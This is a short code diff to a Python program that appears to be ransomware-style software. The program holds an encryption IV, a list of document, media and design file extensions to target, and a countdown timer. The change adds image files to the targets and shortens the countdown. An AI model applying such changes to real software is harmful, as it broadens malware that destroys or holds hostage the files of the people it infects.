@@ -24,7 +24,7 @@ iv = os.urandom(16)
 UUID = uuid.getnode()
 extlist = \
     ['doc', 'docx', 'txt', 'hwp', 'ppt', 'pptx', 'xlsx', 'xls', 'pdf',
-     #'jpg', 'jpeg', 'png', 'gif',
+     'jpg', 'jpeg', 'png', 'gif',
      'mp3', 'wav', 'wma',
      'psd', 'pdd', 'ai', 'dwg', 'dxf', '3dm']
 
@@ -345,7 +345,7 @@ def startTimer(gui, path, ext=None):
     gui.listWindow.lift()
     gui.list.pack()
 
-    clock(gui, 500, antdd_filelist)
+    clock(gui, 300, antdd_filelist)
 
 
 def clock(gui, sec, antdd_filelist):
